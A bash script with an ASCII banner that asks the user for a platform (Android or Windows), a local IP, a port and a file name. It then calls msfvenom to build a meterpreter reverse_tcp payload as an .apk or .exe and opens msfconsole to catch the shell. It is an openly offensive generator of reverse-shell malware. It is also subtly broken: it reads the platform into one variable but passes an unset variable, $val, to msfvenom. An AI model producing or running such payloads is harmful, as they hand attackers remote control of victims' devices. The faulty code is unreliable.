#!/bin/bash
# resize terminal window
resize -s 70 100 > /dev/null
#Colors
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
RedF="${Escape}[31m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Escape}[36m";
Reset="${Escape}[0m";
clear
echo 
echo -e $CyanF"======================================================================================="
echo -e $yellow "     ██╗  ██╗███████╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗"
echo -e $lightgreen"      ██║ ██╔╝██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝"
echo -e $green"      █████╔╝ ███████╗    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗"
echo -e $cyan"      ██╔═██╗ ╚════██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║"
echo -e $blue"      ██║  ██╗███████║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║"
echo -e $red"      ╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝"
echo -e $CyanF"==============================  #  coded by krishna   #   =================================="
echo
echo
echo
echo -e "reverse shell payloads"
echo
echo 
echo  -e $blue " 1.  android"
echo -e $red " 2.  windows"
echo
echo -e $yellow " [*]     \nTEXT YOUR PAYLOAD TYPE NAME (AS SHOWN ABOVE):"
read num
echo -e $cyan "   [*]     What Is Your Local Ip:"
read lhost
echo
echo  "    [*]  Choose A Port Number (Between 1-9999) :"
read lport
echo
echo  "     [*]      Choose A Payload Name With Extension (For Android .Apk,For Windows .Exe)"
read fname
echo
echo "💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️💣️"
echo "=========================================================================================="
echo
echo
echo "you have selected platform =" $num
echo "your IP is ="$lhost 
echo "choosed port is =" $lport
echo "choosed file name ="$fname
echo
echo "===========================payload creation is under process==============================="
echo
echo
echo
echo 
msfvenom -p $val/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R>$fname 
echo
echo "=====================================payload created========================================"
echo "============================================================================================"
echo "====================================opening msfconsole !! =================================="
echo "============================================================================================"
msfconsole
